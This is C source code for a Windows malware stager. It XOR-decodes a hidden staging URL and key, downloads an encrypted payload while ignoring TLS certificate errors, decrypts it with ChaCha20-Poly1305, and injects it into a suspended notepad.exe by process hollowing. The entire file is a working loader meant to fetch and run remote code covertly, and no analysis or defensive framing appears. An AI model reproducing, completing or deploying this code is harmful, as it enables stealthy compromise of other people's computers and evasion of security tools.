#include <windows.h>
#include <winhttp.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "crypto.h"
#include "stager_config.h"

/* Defined in hollow.c */
extern int hollow_inject(const uint8_t *pe_buf, size_t pe_len);

/* XOR deobfuscation of config values */
static void _cfg_decode(const unsigned char *src, size_t len, char *dst)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = (char)(src[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN]);
    dst[len] = '\0';
}

/* download URL into malloc'd buffer */
static uint8_t *_http_get(const char *url, size_t *out_len)
{
    *out_len = 0;

    wchar_t url_w[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, url, -1, url_w, 512);

    wchar_t host[256] = {0}, path[512] = {0};
    URL_COMPONENTS uc = {
        .dwStructSize    = sizeof(uc),
        .lpszHostName    = host, .dwHostNameLength = 256,
        .lpszUrlPath     = path, .dwUrlPathLength  = 512,
    };
    if (!WinHttpCrackUrl(url_w, 0, 0, &uc)) return NULL;

    BOOL          secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port   = uc.nPort ? uc.nPort : (INTERNET_PORT)(secure ? 443 : 80);

    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return NULL;

    HINTERNET hC = WinHttpConnect(hS, host, port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return NULL; }

    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return NULL; }

    if (secure) {
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                   | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
    }
    WinHttpSetTimeouts(hR, 30000, 30000, 30000, 30000);

    if (!WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return NULL;
    }

    uint8_t *buf = NULL;
    size_t   len = 0;
    DWORD    avail;
    while (WinHttpQueryDataAvailable(hR, &avail) && avail > 0) {
        uint8_t *tmp = realloc(buf, len + avail);
        if (!tmp) break;
        buf = tmp;
        DWORD nread = 0;
        WinHttpReadData(hR, buf + len, avail, &nread);
        len += nread;
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);

    if (buf) *out_len = len;
    return buf;
}

/* entry point */

int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int show)
{
    (void)h; (void)hp; (void)cmd; (void)show;

    /* decode staging URL */
    char url[512] = {0};
    _cfg_decode(CFG_STAGE_URL, CFG_STAGE_URL_LEN, url);

    /* decode ChaCha20 key */
    uint8_t key[CHACHA20_KEY_SIZE] = {0};
    for (int i = 0; i < CHACHA20_KEY_SIZE; i++)
        key[i] = CFG_STAGE_KEY[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN];

    /* download encrypted stage */
    size_t   blob_len = 0;
    uint8_t *blob     = _http_get(url, &blob_len);
    if (!blob) return 1;

    /* wire format: nonce(12) | ciphertext | tag(16) */
    if (blob_len < CHACHA20_NONCE_SIZE + POLY1305_TAG_SIZE + 64) {
        free(blob); return 1;
    }

    const uint8_t *nonce  = blob;
    size_t         ct_len = blob_len - CHACHA20_NONCE_SIZE - POLY1305_TAG_SIZE;
    const uint8_t *ct     = blob + CHACHA20_NONCE_SIZE;
    const uint8_t *tag    = blob + CHACHA20_NONCE_SIZE + ct_len;

    uint8_t *pe = (uint8_t *)malloc(ct_len);
    if (!pe) { free(blob); return 1; }

    int rc = chacha20_poly1305_decrypt(key, nonce, ct, ct_len, tag, pe);
    SecureZeroMemory(key,  sizeof(key));
    SecureZeroMemory(blob, blob_len);
    free(blob);

    if (rc != 0) { free(pe); return 1; }

    /* Inject into suspended notepad.exe */
    rc = hollow_inject(pe, ct_len);
    SecureZeroMemory(pe, ct_len);
    free(pe);
    return (rc == 0) ? 0 : 1;
}